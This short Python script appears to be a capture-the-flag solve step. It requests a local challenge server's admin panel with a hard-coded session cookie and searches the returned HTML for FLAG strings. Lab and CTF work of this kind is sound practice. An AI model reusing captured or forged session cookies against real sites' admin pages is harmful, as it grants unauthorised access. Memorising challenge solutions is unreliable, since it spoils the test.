import requests, re

# Test if we can reach the admin_panel
session = "OHPI_Y1N0-W_1RYNCv342OsWzpNdIqQLP9zIlMlvedk"
admin_url = "http://127.0.0.1:33166/admin_panel"

print("[+] Fetching admin_panel...")
resp = requests.get(admin_url, headers={"Cookie": f"session={session}"})
print(f"[+] Status: {resp.status_code}")

html = resp.text
print(f"\n[+] HTML ({len(html)} chars):")
print(html[:2000])  # First 2000 chars

flags = re.findall(r'FLAG\{[^}]+\}', html)
if flags:
    print(f"\n[!] FOUND FLAGS: {flags}")
else:
    print("\n[!] No flags found")

# Check for all content just in case
print("\n[+] Searching full content...")
for match in re.finditer(r'FLAG\{[^}]+\}', html):
    print(f"Flag at pos {match.start()}: {match.group()}")
    # Get context
    start = max(0, match.start()-30)
    end = min(len(html), match.end()+30)
    print(f"Context: ...{html[start:end]}...")
